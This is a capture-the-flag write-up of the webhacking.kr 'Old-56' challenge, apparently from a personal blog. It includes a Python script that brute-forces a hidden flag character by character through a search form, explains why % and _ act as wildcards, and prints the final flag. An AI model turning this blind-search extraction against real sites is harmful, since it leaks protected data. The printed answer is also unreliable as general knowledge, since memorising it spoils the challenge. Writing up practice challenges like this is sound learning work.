---
layout: post
title: "[Webhacking.kr] Old-56 writeup"
categories: hacking writeup web
---

# Introduction

Link: [https://webhacking.kr/challenge/web-33/](https://webhacking.kr/challenge/web-33/)

The challenge is quite easy to understand. You can not enter the admin page, you can enter the
guest page. You also have a search function to search for content in all pages.

![Main](/assets/images/old-56/main.png)

Let's try the search function by using content inside of `guest`

![Search](/assets/images/old-56/search.png)

# Let's find a way to get in

The first thing to try is SQL Injection. Didn't work.

The second thing to try is to find some kind of known vulnerabilty in `strpos` function.
I had a feeling that it might be using `strpos` for the search function. Nothing relevant found.

But one thing I forgot, the content inside admin page is very likely a flag. A search
with `flag{` as the query returned the admin page. An important clue!

![Flag Search](/assets/images/old-56/flag_search.png)

# Bruteforce the flag

It is obvious that the flag can be bruteforced in a matter of minutes. Let's write a short script

```python
import requests, string

cookies = {
    'PHPSESSID': '8sgmg9vml43qsn1gktg85jipj5',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://webhacking.kr',
    'Connection': 'keep-alive',
    'Referer': 'https://webhacking.kr/challenge/web-33/index.php',
    # 'Cookie': 'PHPSESSID=8sgmg9vml43qsn1gktg85jipj5;
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

current = 'flag{'

def correct(c):
    data = {
    'search': current + c
    }

    response = requests.post('https://webhacking.kr/challenge/web-33/index.php',
                         cookies=cookies, headers=headers, data=data)

    return "admin" in response.text

def brute():
    global current
    while current[-1] != '}':
        last_correct = False
        print("trying ...")
        for c in list(string.ascii_lowercase + string.punctuation):
            print(f"{current + c}")
            if correct(c):
                current = current + c
                print(f"current: {current}")
                last_correct = True
                break

        if last_correct == False:
            print("no matches! stopping")
            break

brute()
```

After a couple of tries, I found that `%` was accepted in many places. So the result was `flag{himiko%a%cute%dont%hink%o%%`, which was close but not what I wanted.

So I decided to remove the `%` in the code, and tried again.

```python
#...
    for c in list(string.ascii_lowercase + string.punctuation.replace('%', '')):
#...
```

![Result1](/assets/images/old-56/result1.png)

Gotcha, you man of culture! But wait, that one was not correct either. Later, I found that the underscore character `_` was just like `%`, how annoying.

And after a bit of tuning, I found the correct flag!

`flag{himiko_toga_is_cute_dont_you_think_so?}`
